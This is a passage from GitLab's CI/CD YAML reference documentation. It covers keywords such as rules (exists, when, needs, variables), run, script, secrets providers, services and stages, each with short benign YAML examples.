CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `rules:changes:compare_to`**:

YAML Copy to clipboard

```yaml
docker build:
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      changes:
        paths:
          - Dockerfile
        compare_to: 'refs/heads/branch1'
```

In this example, the `docker build` job is only included when the `Dockerfile` has changed
relative to `refs/heads/branch1` and the pipeline source is a merge request event.

**Additional details**:

- Using `compare_to` with [merged results pipelines](https://docs.gitlab.com/ci/pipelines/merged_results_pipelines/#troubleshooting) can cause unexpected results, because the comparison base is an internal commit that GitLab creates.

**Related topics**:

- You can use `rules:changes:compare_to` to [skip a job if the branch is empty](https://docs.gitlab.com/ci/jobs/job_rules/#skip-jobs-if-the-branch-is-empty).

#### `rules:exists` [Permalink](https://docs.gitlab.com/ci/yaml/\#rulesexists "Permalink")

History

- CI/CD variable support [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/283881) in GitLab 15.6.
- Maximum number of checks against `exists` patterns or file paths [increased](https://gitlab.com/gitlab-org/gitlab/-/issues/227632) from 10,000 to 50,000 in GitLab 17.7.
- Support for directory paths [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/327485) in GitLab 18.2.

Use `exists` to run a job when certain files or directories exist in the repository.

**Keyword type**: Job keyword. You can use it as part of a job or an [`include`](https://docs.gitlab.com/ci/yaml/#include).

**Supported values**:

- An array of file or directory paths. Paths are relative to the project directory ( `$CI_PROJECT_DIR`)
and can’t directly link outside it. File paths can use glob patterns and
[CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `rules:exists`**:

YAML Copy to clipboard

```yaml
job:
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - exists:
        - Dockerfile

job2:
variables:
    DOCKERPATH: "**/Dockerfile"
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - exists:
        - $DOCKERPATH
```

In this example:

- `job1` runs if a `Dockerfile` exists in the root directory of the repository.
- `job2` runs if a `Dockerfile` exists anywhere in the repository.

**Additional details**:

- Glob patterns are interpreted with Ruby’s [`File.fnmatch`](https://docs.ruby-lang.org/en/master/File.html#method-c-fnmatch)
with the [flags](https://docs.ruby-lang.org/en/master/File/Constants.html#module-File::Constants-label-Filename+Globbing+Constants+-28File-3A-3AFNM_-2A-29) `File::FNM_PATHNAME | File::FNM_DOTMATCH | File::FNM_EXTGLOB`.
- For performance reasons, GitLab performs a maximum of 50,000 checks against
`exists` patterns or file paths. After the 50,000th check, rules with patterned
globs always match. In other words, the `exists` rule always assumes a match in
projects with more than 50,000 files, or if there are fewer than 50,000 files but
the `exists` rules are checked more than 50,000 times.  - If there are multiple patterned globs, the limit is 50,000 divided by the number
      of globs. For example, a rule with 5 patterned globs has file limit of 10,000.
- A maximum of 50 patterns or file paths can be defined per `rules:exists` section.
- `exists` resolves to `true` if any of the listed files are found (an `OR` operation).
- With job-level `rules:exists`, GitLab searches for the files in the project and
ref that runs the pipeline. When using [`include` with `rules:exists`](https://docs.gitlab.com/ci/yaml/includes/#include-with-rulesexists),
GitLab searches for the files or directories in the project and ref of the file that contains the `include`
section. The project containing the `include` section can be different than the project
running the pipeline when using:
  - [Nested includes](https://docs.gitlab.com/ci/yaml/includes/#use-nested-includes).
  - [Compliance pipelines](https://docs.gitlab.com/user/compliance/compliance_pipelines/).
- `rules:exists` cannot search for the presence of [artifacts](https://docs.gitlab.com/ci/jobs/job_artifacts/),
because `rules` evaluation happens before jobs run and artifacts are fetched.
- To test the existence of a directory, the path must end with a forward slash (/)

##### `rules:exists:paths` [Permalink](https://docs.gitlab.com/ci/yaml/\#rulesexistspaths "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/386040) in GitLab 16.11 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_support_rules_exists_paths_and_project`. Disabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/386040) in GitLab 17.0. Feature flag `ci_support_rules_exists_paths_and_project` removed.

`rules:exists:paths` is the same as using [`rules:exists`](https://docs.gitlab.com/ci/yaml/#rulesexists) without
any subkeys. All additional details are the same.

**Keyword type**: Job keyword. You can use it as part of a job or an [`include`](https://docs.gitlab.com/ci/yaml/#include).

**Supported values**:

- An array of file paths.

**Example of `rules:exists:paths`**:

YAML Copy to clipboard

```yaml
docker-build-1:
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      exists:
        - Dockerfile

docker-build-2:
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      exists:
        paths:
          - Dockerfile
```

In this example, both jobs have the same behavior.

**Additional details**:

- In some cases you cannot use `/` or `./` in a CI/CD variable with `exists`.
See [issue 386595](https://gitlab.com/gitlab-org/gitlab/-/issues/386595) for more details.

##### `rules:exists:project` [Permalink](https://docs.gitlab.com/ci/yaml/\#rulesexistsproject "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/386040) in GitLab 16.11 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_support_rules_exists_paths_and_project`. Disabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/386040) in GitLab 17.0. Feature flag `ci_support_rules_exists_paths_and_project` removed.

Use `rules:exists:project` to specify the location in which to search for the files
listed under [`rules:exists:paths`](https://docs.gitlab.com/ci/yaml/#rulesexistspaths). Must be used with `rules:exists:paths`.

**Keyword type**: Job keyword. You can use it as part of a job or an [`include`](https://docs.gitlab.com/ci/yaml/#include), and it must be combined with `rules:exists:paths`.

**Supported values**:

- `exists:project`: A full project path, including namespace and group.
- `exists:ref`: Optional. The commit ref to use to search for the file. The ref can be a tag, branch name, or SHA. Defaults to the `HEAD` of the project when not specified.

**Example of `rules:exists:project`**:

YAML Copy to clipboard

```yaml
docker build:
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - exists:
        paths:
          - Dockerfile
        project: my-group/my-project
        ref: v1.0.0
```

In this example, the `docker build` job is only included when the `Dockerfile` exists in
the project `my-group/my-project` on the commit tagged with `v1.0.0`.

#### `rules:when` [Permalink](https://docs.gitlab.com/ci/yaml/\#ruleswhen "Permalink")

Use `rules:when` alone or as part of another rule to control conditions for adding
a job to a pipeline. `rules:when` is similar to [`when`](https://docs.gitlab.com/ci/yaml/#when), but with slightly
different input options.

If a `rules:when` rule is not combined with `if`, `changes`, or `exists`, it always matches
if reached when evaluating a job’s rules.

**Keyword type**: Job-specific. You can use it only as part of a job.

**Supported values**:

- `on_success` (default): Run the job only when no jobs in earlier stages fail.
- `on_failure`: Run the job only when at least one job in an earlier stage fails.
- `never`: Don’t run the job regardless of the status of jobs in earlier stages.
- `always`: Run the job regardless of the status of jobs in earlier stages.
- `manual`: Add the job to the pipeline as a [manual job](https://docs.gitlab.com/ci/jobs/job_control/#create-a-job-that-must-be-run-manually).
The default value for [`allow_failure`](https://docs.gitlab.com/ci/yaml/#allow_failure) changes to `false`.
- `delayed`: Add the job to the pipeline as a [delayed job](https://docs.gitlab.com/ci/jobs/job_control/#run-a-job-after-a-delay).

**Example of `rules:when`**:

YAML Copy to clipboard

```yaml
job1:
rules:
    - if: $CI_COMMIT_REF_NAME == $CI_DEFAULT_BRANCH
    - if: $CI_COMMIT_REF_NAME =~ /feature/
      when: delayed
    - when: manual
script:
    - echo
```

In this example, `job1` is added to pipelines:

- For the default branch, with `when: on_success` which is the default behavior
when `when` is not defined.
- For feature branches as a delayed job.
- In all other cases as a manual job.

**Additional details**:

- When evaluating the status of jobs for `on_success` and `on_failure`:
  - Jobs with [`allow_failure: true`](https://docs.gitlab.com/ci/yaml/#allow_failure) in earlier stages are considered successful, even if they failed.
  - Skipped jobs in earlier stages, for example [manual jobs that have not been started](https://docs.gitlab.com/ci/jobs/job_control/#create-a-job-that-must-be-run-manually),
    are considered successful.
- When using `rules:when: manual` to [add a manual job](https://docs.gitlab.com/ci/jobs/job_control/#create-a-job-that-must-be-run-manually):
  - [`allow_failure`](https://docs.gitlab.com/ci/yaml/#allow_failure) becomes `false` by default. This default is the opposite of
    using [`when: manual`](https://docs.gitlab.com/ci/yaml/#when) to add a manual job.
  - To achieve the same behavior as `when: manual` defined outside of `rules`, set [`rules: allow_failure`](https://docs.gitlab.com/ci/yaml/#rulesallow_failure) to `true`.

#### `rules:allow_failure` [Permalink](https://docs.gitlab.com/ci/yaml/\#rulesallow_failure "Permalink")

Use [`allow_failure: true`](https://docs.gitlab.com/ci/yaml/#allow_failure) in `rules` to allow a job to fail
without stopping the pipeline.

You can also use `allow_failure: true` with a manual job. The pipeline continues
running without waiting for the result of the manual job. `allow_failure: false`
combined with `when: manual` in rules causes the pipeline to wait for the manual
job to run before continuing.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `true` or `false`. Defaults to `false` if not defined.

**Example of `rules:allow_failure`**:

YAML Copy to clipboard

```yaml
job:
script: echo "Hello, Rules!"
rules:
    - if: $CI_MERGE_REQUEST_TARGET_BRANCH_NAME == $CI_DEFAULT_BRANCH
      when: manual
      allow_failure: true
```

If the rule matches, then the job is a manual job with `allow_failure: true`.

**Additional details**:

- The rule-level `rules:allow_failure` overrides the job-level [`allow_failure`](https://docs.gitlab.com/ci/yaml/#allow_failure),
and only applies when the specific rule triggers the job.

#### `rules:needs` [Permalink](https://docs.gitlab.com/ci/yaml/\#rulesneeds "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/31581) in GitLab 16.0 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `introduce_rules_with_needs`. Disabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/408871) in GitLab 16.2. Feature flag `introduce_rules_with_needs` removed.

Use `needs` in rules to update a job’s [`needs`](https://docs.gitlab.com/ci/yaml/#needs) for specific conditions. When a condition matches a rule, the job’s `needs` configuration is completely replaced with the `needs` in the rule.

**Keyword type**: Job-specific. You can use it only as part of a job.

**Supported values**:

- An array of job names as strings.
- A hash with a job name, optionally with additional attributes.
- An empty array ( `[]`), to set the job needs to none when the specific condition is met.

**Example of `rules:needs`**:

YAML Copy to clipboard

```yaml
build-dev:
stage: build
rules:
    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
script: echo "Feature branch, so building dev version..."

build-prod:
stage: build
rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
script: echo "Default branch, so building prod version..."

tests:
stage: test
rules:
    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
      needs: ['build-dev']
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      needs: ['build-prod']
script: echo "Running dev specs by default, or prod specs when default branch..."
```

In this example:

- If the pipeline runs on a branch that is not the default branch, and therefore the rule matches the first condition, the `specs` job needs the `build-dev` job.
- If the pipeline runs on the default branch, and therefore the rule matches the second condition, the `specs` job needs the `build-prod` job.

**Additional details**:

- `needs` in rules override any `needs` defined at the job-level. When overridden, the behavior is same as [job-level `needs`](https://docs.gitlab.com/ci/yaml/#needs).
- `needs` in rules can accept [`artifacts`](https://docs.gitlab.com/ci/yaml/#needsartifacts) and [`optional`](https://docs.gitlab.com/ci/yaml/#needsoptional).

#### `rules:variables` [Permalink](https://docs.gitlab.com/ci/yaml/\#rulesvariables "Permalink")

Use [`variables`](https://docs.gitlab.com/ci/yaml/#variables) in `rules` to define variables for specific conditions.

**Keyword type**: Job-specific. You can use it only as part of a job.

**Supported values**:

- A hash of variables in the format `VARIABLE-NAME: value`.

**Example of `rules:variables`**:

YAML Copy to clipboard

```yaml
job:
variables:
    DEPLOY_VARIABLE: "default-deploy"
rules:
    - if: $CI_COMMIT_REF_NAME == $CI_DEFAULT_BRANCH
      variables:                              # Override DEPLOY_VARIABLE defined
        DEPLOY_VARIABLE: "deploy-production"  # at the job level.
    - if: $CI_COMMIT_REF_NAME =~ /feature/
      variables:
        IS_A_FEATURE: "true"                  # Define a new variable.
script:
    - echo "Run script with $DEPLOY_VARIABLE as an argument"
    - echo "Run another script if $IS_A_FEATURE exists"
```

#### `rules:interruptible` [Permalink](https://docs.gitlab.com/ci/yaml/\#rulesinterruptible "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/194023) in GitLab 16.10.

Use `interruptible` in rules to update a job’s [`interruptible`](https://docs.gitlab.com/ci/yaml/#interruptible) value for specific conditions.

**Keyword type**: Job-specific. You can use it only as part of a job.

**Supported values**:

- `true` or `false`.

**Example of `rules:interruptible`**:

YAML Copy to clipboard

```yaml
job:
script: echo "Hello, Rules!"
interruptible: true
rules:
    - if: $CI_COMMIT_REF_NAME == $CI_DEFAULT_BRANCH
      interruptible: false  # Override interruptible defined at the job level.
    - when: on_success
```

**Additional details**:

- The rule-level `rules:interruptible` overrides the job-level [`interruptible`](https://docs.gitlab.com/ci/yaml/#interruptible),
and only applies when the specific rule triggers the job.

### `run` [Permalink](https://docs.gitlab.com/ci/yaml/\#run "Permalink")

- Status: Experiment

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/440487) in GitLab 17.3 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `pipeline_run_keyword`. Disabled by default. Requires GitLab Runner 17.1.
- Feature flag `pipeline_run_keyword` [removed](https://gitlab.com/gitlab-org/gitlab/-/issues/471925) in GitLab 17.5.

This feature is available for testing, but not ready for production use.

Use `run` to define a series of [steps](https://docs.gitlab.com/ci/steps/) to be executed in a job. Each step can be either a script or a predefined step.

You can also provide optional environment variables and inputs.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- An array of hashes, where each hash represents a step with the following possible keys:
  - `name`: A string representing the name of the step.
  - `script`: A string or array of strings containing shell commands to execute.
  - `step`: A string identifying a predefined step to run.
  - `env`: Optional. A hash of environment variables specific to this step.
  - `inputs`: Optional. A hash of input parameters for predefined steps.

Each array entry must have a `name`, and one `script` or `step` (but not both).

**Example of `run`**:

YAML Copy to clipboard

```yaml
job:
run:
    - name: 'hello_steps'
      script: 'echo "hello from step1"'
    - name: 'bye_steps'
      step: gitlab.com/gitlab-org/ci-cd/runner-tools/echo-step@main
      inputs:
        echo: 'bye steps!'
      env:
        var1: 'value 1'
```

In this example, the job has two steps:

- `hello_steps` runs the `echo` shell command.
- `bye_steps` uses a predefined step with an environment variable and an input parameter.

**Additional details**:

- A step can have either a `script` or a `step` key, but not both.
- A `run` configuration cannot be used together with existing [`script`](https://docs.gitlab.com/ci/yaml/#script), [`after_script`](https://docs.gitlab.com/ci/yaml/#after_script) or [`before_script`](https://docs.gitlab.com/ci/yaml/#before_script) keywords.
- Multi-line scripts can be defined using [YAML block scalar syntax](https://docs.gitlab.com/ci/yaml/script/#split-long-commands).

### `script` [Permalink](https://docs.gitlab.com/ci/yaml/\#script "Permalink")

Use `script` to specify commands for the runner to execute.

All jobs except [trigger jobs](https://docs.gitlab.com/ci/yaml/#trigger) require a `script` keyword.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: An array including:

- Single line commands.
- Long commands [split over multiple lines](https://docs.gitlab.com/ci/yaml/script/#split-long-commands).
- [YAML anchors](https://docs.gitlab.com/ci/yaml/yaml_optimization/#yaml-anchors-for-scripts).

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `script`**:

YAML Copy to clipboard

```yaml
job1:
script: "bundle exec rspec"

job2:
script:
    - uname -a
    - bundle exec rspec
```

**Additional details**:

- When you use [these special characters in `script`](https://docs.gitlab.com/ci/yaml/script/#use-special-characters-with-script), you must use single quotes ( `'`) or double quotes ( `"`).

**Related topics**:

- You can [ignore non-zero exit codes](https://docs.gitlab.com/ci/yaml/script/#ignore-non-zero-exit-codes).
- [Use color codes with `script`](https://docs.gitlab.com/ci/yaml/script/#add-color-codes-to-script-output)
to make job logs easier to review.
- [Create custom collapsible sections](https://docs.gitlab.com/ci/jobs/job_logs/#custom-collapsible-sections)
to simplify job log output.

### `secrets` [Permalink](https://docs.gitlab.com/ci/yaml/\#secrets "Permalink")

- Tier: Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

Use `secrets` to specify [CI/CD secrets](https://docs.gitlab.com/ci/secrets/) to:

- Retrieve from an external secrets provider.
- Make available in the job as [CI/CD variables](https://docs.gitlab.com/ci/variables/)
( [`file` type](https://docs.gitlab.com/ci/variables/#use-file-type-cicd-variables) by default).

#### `secrets:vault` [Permalink](https://docs.gitlab.com/ci/yaml/\#secretsvault "Permalink")

History

- `generic` engine option [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/366492) in GitLab Runner 16.11.

Use `secrets:vault` to specify secrets provided by a [HashiCorp Vault](https://www.vaultproject.io/).

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `engine:name`: Name of the secrets engine. Can be one of `kv-v2` (default), `kv-v1`, or `generic`.
- `engine:path`: Path to the secrets engine.
- `path`: Path to the secret.
- `field`: Name of the field where the password is stored.

**Example of `secrets:vault`**:

To specify all details explicitly and use the [KV-V2](https://developer.hashicorp.com/vault/docs/secrets/kv/kv-v2) secrets engine:

YAML Copy to clipboard

```yaml
job:
secrets:
    DATABASE_PASSWORD:  # Store the path to the secret in this CI/CD variable
      vault:  # Translates to secret: `ops/data/production/db`, field: `password`
        engine:
          name: kv-v2
          path: ops
        path: production/db
        field: password
```

You can shorten this syntax. With the short syntax, `engine:name` and `engine:path`
both default to `kv-v2`:

YAML Copy to clipboard

```yaml
job:
secrets:
    DATABASE_PASSWORD:  # Store the path to the secret in this CI/CD variable
      vault: production/db/password  # Translates to secret: `kv-v2/data/production/db`, field: `password`
```

To specify a custom secrets engine path in the short syntax, add a suffix that starts with `@`:

YAML Copy to clipboard

```yaml
job:
secrets:
    DATABASE_PASSWORD:  # Store the path to the secret in this CI/CD variable
      vault: production/db/password@ops  # Translates to secret: `ops/data/production/db`, field: `password`
```

#### `secrets:gcp_secret_manager` [Permalink](https://docs.gitlab.com/ci/yaml/\#secretsgcp_secret_manager "Permalink")

History

- [Introduced](https://gitlab.com/groups/gitlab-org/-/epics/11739) in GitLab 16.8 and GitLab Runner 16.8.

Use `secrets:gcp_secret_manager` to specify secrets provided by [GCP Secret Manager](https://cloud.google.com/security/products/secret-manager).

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `name`: Name of the secret.
- `version`: Version of the secret.

**Example of `secrets:gcp_secret_manager`**:

YAML Copy to clipboard

```yaml
job:
secrets:
    DATABASE_PASSWORD:
      gcp_secret_manager:
        name: 'test'
        version: 2
```

**Related topics**:

- [Use GCP Secret Manager secrets in GitLab CI/CD](https://docs.gitlab.com/ci/secrets/gcp_secret_manager/).

#### `secrets:azure_key_vault` [Permalink](https://docs.gitlab.com/ci/yaml/\#secretsazure_key_vault "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/271271) in GitLab 16.3 and GitLab Runner 16.3.

Use `secrets:azure_key_vault` to specify secrets provided by a [Azure Key Vault](https://azure.microsoft.com/en-us/products/key-vault/).

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `name`: Name of the secret.
- `version`: Version of the secret.

**Example of `secrets:azure_key_vault`**:

YAML Copy to clipboard

```yaml
job:
secrets:
    DATABASE_PASSWORD:
      azure_key_vault:
        name: 'test'
        version: 'test'
```

**Related topics**:

- [Use Azure Key Vault secrets in GitLab CI/CD](https://docs.gitlab.com/ci/secrets/azure_key_vault/).

#### `secrets:file` [Permalink](https://docs.gitlab.com/ci/yaml/\#secretsfile "Permalink")

Use `secrets:file` to configure the secret to be stored as either a
[`file` or `variable` type CI/CD variable](https://docs.gitlab.com/ci/variables/#use-file-type-cicd-variables)

By default, the secret is passed to the job as a `file` type CI/CD variable. The value
of the secret is stored in the file and the variable contains the path to the file.

If your software can’t use `file` type CI/CD variables, set `file: false` to store
the secret value directly in the variable.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `true` (default) or `false`.

**Example of `secrets:file`**:

YAML Copy to clipboard

```yaml
job:
secrets:
    DATABASE_PASSWORD:
      vault: production/db/password@ops
      file: false
```

**Additional details**:

- The `file` keyword is a setting for the CI/CD variable and must be nested under
the CI/CD variable name, not in the `vault` section.

#### `secrets:token` [Permalink](https://docs.gitlab.com/ci/yaml/\#secretstoken "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/356986) in GitLab 15.8, controlled by the **Limit JSON Web Token (JWT) access** setting.
- [Made always available and **Limit JSON Web Token (JWT) access** setting removed](https://gitlab.com/gitlab-org/gitlab/-/issues/366798) in GitLab 16.0.

Use `secrets:token` to explicitly select a token to use when authenticating with the external secrets provider by referencing the token’s CI/CD variable.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- The name of an ID token

**Example of `secrets:token`**:

YAML Copy to clipboard

```yaml
job:
id_tokens:
    AWS_TOKEN:
      aud: https://aws.example.com
    VAULT_TOKEN:
      aud: https://vault.example.com
secrets:
    DB_PASSWORD:
      vault: gitlab/production/db
      token: $VAULT_TOKEN
```

**Additional details**:

- When the `token` keyword is not set and there is only one token defined, the defined token will automatically be used.
- If there is more than one token defined, you should specify which token to use by setting the `token` keyword.
If you do not specify which token to use, it is not possible to predict which token is used each time the job runs.

### `services` [Permalink](https://docs.gitlab.com/ci/yaml/\#services "Permalink")

Use `services` to specify any additional Docker images that your scripts require to run successfully. The [`services` image](https://docs.gitlab.com/ci/services/) is linked
to the image specified in the [`image`](https://docs.gitlab.com/ci/yaml/#image) keyword.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**: The name of the services image, including the registry path if needed, in one of these formats:

- `<image-name>` (Same as using `<image-name>` with the `latest` tag)
- `<image-name>:<tag>`
- `<image-name>@<digest>`

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file), but [not for `alias`](https://gitlab.com/gitlab-org/gitlab/-/issues/19561).

**Example of `services`**:

YAML Copy to clipboard

```yaml
default:
image:
    name: ruby:2.6
    entrypoint: ["/bin/bash"]

services:
    - name: my-postgres:11.7
      alias: db-postgres
      entrypoint: ["/usr/local/bin/db-postgres"]
      command: ["start"]

before_script:
    - bundle install

test:
script:
    - bundle exec rake spec
```

In this example, GitLab launches two containers for the job:

- A Ruby container that runs the `script` commands.
- A PostgreSQL container. The `script` commands in the Ruby container can connect to
the PostgreSQL database at the `db-postgres` hostname.

**Related topics**:

- [Available settings for `services`](https://docs.gitlab.com/ci/services/#available-settings-for-services).
- [Define `services` in the `.gitlab-ci.yml` file](https://docs.gitlab.com/ci/services/#define-services-in-the-gitlab-ciyml-file).
- [Run your CI/CD jobs in Docker containers](https://docs.gitlab.com/ci/docker/using_docker_images/).
- [Use Docker to build Docker images](https://docs.gitlab.com/ci/docker/using_docker_build/).

#### `services:docker` [Permalink](https://docs.gitlab.com/ci/yaml/\#servicesdocker "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/27919) in GitLab 16.7. Requires GitLab Runner 16.7 or later.
- `user` input option [introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/137907) in GitLab 16.8.

Use `services:docker` to pass options to the Docker executor of a GitLab Runner.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

A hash of options for the Docker executor, which can include:

- `platform`: Selects the architecture of the image to pull. When not specified,
the default is the same platform as the host runner.
- `user`: Specify the username or UID to use when running the container.

**Example of `services:docker`**:

YAML Copy to clipboard

```yaml
arm-sql-job:
script: echo "Run sql tests in service container"
image: ruby:2.6
services:
    - name: super/sql:experimental
      docker:
        platform: arm64/v8
        user: dave
```

**Additional details**:

- `services:docker:platform` maps to the [`docker pull --platform` option](https://docs.docker.com/reference/cli/docker/image/pull/#options).
- `services:docker:user` maps to the [`docker run --user` option](https://docs.docker.com/reference/cli/docker/container/run/#options).

#### `services:kubernetes` [Permalink](https://docs.gitlab.com/ci/yaml/\#serviceskubernetes "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/38451) in GitLab 18.0. Requires GitLab Runner 17.11 or later.
- `user` input option [introduced](https://gitlab.com/gitlab-org/gitlab-runner/-/merge_requests/5469) in GitLab Runner 17.11.
- `user` input option [extended to support `uid:gid` format](https://gitlab.com/gitlab-org/gitlab-runner/-/merge_requests/5540) in GitLab 18.0.

Use `services:kubernetes` to pass options to the GitLab Runner [Kubernetes executor](https://docs.gitlab.com/runner/executors/kubernetes/).

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

A hash of options for the Kubernetes executor, which can include:

- `user`: Specify the username or UID to use when the container runs. You can also use it to set GID by using the `UID:GID` format.

**Example of `services:kubernetes` with only UID**:

YAML Copy to clipboard

```yaml
arm-sql-job:
script: echo "Run sql tests"
image: ruby:2.6
services:
    - name: super/sql:experimental
      kubernetes:
        user: "1001"
```

**Example of `services:kubernetes` with both UID and GID**:

YAML Copy to clipboard

```yaml
arm-sql-job:
script: echo "Run sql tests"
image: ruby:2.6
services:
    - name: super/sql:experimental
      kubernetes:
        user: "1001:1001"
```

#### `services:pull_policy` [Permalink](https://docs.gitlab.com/ci/yaml/\#servicespull_policy "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/21619) in GitLab 15.1 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_docker_image_pull_policy`. Disabled by default.
- [Enabled on GitLab.com and GitLab Self-Managed](https://gitlab.com/gitlab-org/gitlab/-/issues/363186) in GitLab 15.2.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/363186) in GitLab 15.4. [Feature flag `ci_docker_image_pull_policy`](https://gitlab.com/gitlab-org/gitlab/-/issues/363186) removed.

The pull policy that the runner uses to fetch the Docker image. Requires GitLab Runner 15.1 or later.

**Keyword type**: Job keyword. You can use it only as part of a job or in the [`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- A single pull policy, or multiple pull policies in an array.
Can be `always`, `if-not-present`, or `never`.

**Examples of `services:pull_policy`**:

YAML Copy to clipboard

```yaml
job1:
script: echo "A single pull policy."
services:
    - name: postgres:11.6
      pull_policy: if-not-present

job2:
script: echo "Multiple pull policies."
services:
    - name: postgres:11.6
      pull_policy: [always, if-not-present]
```

**Additional details**:

- If the runner does not support the defined pull policy, the job fails with an error similar to:
`ERROR: Job failed (system failure): the configured PullPolicies ([always]) are not allowed by AllowedPullPolicies ([never])`.

**Related topics**:

- [Run your CI/CD jobs in Docker containers](https://docs.gitlab.com/ci/docker/using_docker_images/).
- [Configure how runners pull images](https://docs.gitlab.com/runner/executors/docker.html#configure-how-runners-pull-images).
- [Set multiple pull policies](https://docs.gitlab.com/runner/executors/docker.html#set-multiple-pull-policies).

### `stage` [Permalink](https://docs.gitlab.com/ci/yaml/\#stage "Permalink")

Use `stage` to define which [stage](https://docs.gitlab.com/ci/yaml/#stages) a job runs in. Jobs in the same
`stage` can execute in parallel (see **Additional details**).

If `stage` is not defined, the job uses the `test` stage by default.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: A string, which can be a:

- [Default stage](https://docs.gitlab.com/ci/yaml/#stages).
- User-defined stages.

**Example of `stage`**:

YAML Copy to clipboard

```yaml
stages:
  - build
  - test
  - deploy

job1:
stage: build
script:
    - echo "This job compiles code."

job2:
stage: test
script:
    - echo "This job tests the compiled code. It runs when the build stage completes."

job3:
script:
    - echo "This job also runs in the test stage."

job4:
stage: deploy
script:
    - echo "This job deploys the code. It runs when the test stage completes."
environment: production
```

**Additional details**:

- The stage name must be 255 characters or fewer.
- Jobs can run in parallel if they run on different runners.
- If you have only one runner, jobs can run in parallel if the runner’s
[`concurrent` setting](https://docs.gitlab.com/runner/configuration/advanced-configuration.html#the-global-section)
is greater than `1`.

#### `stage: .pre` [Permalink](https://docs.gitlab.com/ci/yaml/\#stage-pre "Permalink")

Use the `.pre` stage to make a job run at the start of a pipeline. By default, `.pre` is
the first stage in a pipeline. User-defined stages execute after `.pre`.
You do not have to define `.pre` in [`stages`](https://docs.gitlab.com/ci/yaml/#stages).

If a pipeline contains only jobs in the `.pre` or `.post` stages, it does not run.
There must be at least one other job in a different stage.

**Keyword type**: You can only use it with a job’s `stage` keyword.

**Example of `stage: .pre`**:

YAML Copy to clipboard

```yaml
stages:
  - build
  - test

job1:
stage: build
script:
    - echo "This job runs in the build stage."

first-job:
stage: .pre
script:
    - echo "This job runs in the .pre stage, before all other stages."

job2:
stage: test
script:
    - echo "This job runs in the test stage."
```

**Additional details**:

- If a pipeline has jobs with [`needs: []`](https://docs.gitlab.com/ci/yaml/#needs) and jobs in the `.pre` stage, they will
all start as soon as the pipeline is created. Jobs with `needs: []` start immediately,
ignoring any stage configuration.
- A [pipeline execution policy](https://docs.gitlab.com/user/application_security/policies/pipeline_execution_policies/) can define a `.pipeline-policy-pre` stage which runs before `.pre`.

#### `stage: .post` [Permalink](https://docs.gitlab.com/ci/yaml/\#stage-post "Permalink")

Use the `.post` stage to make a job run at the end of a pipeline. By default, `.post`
is the last stage in a pipeline. User-defined stages execute before `.post`.
You do not have to define `.post` in [`stages`](https://docs.gitlab.com/ci/yaml/#stages).

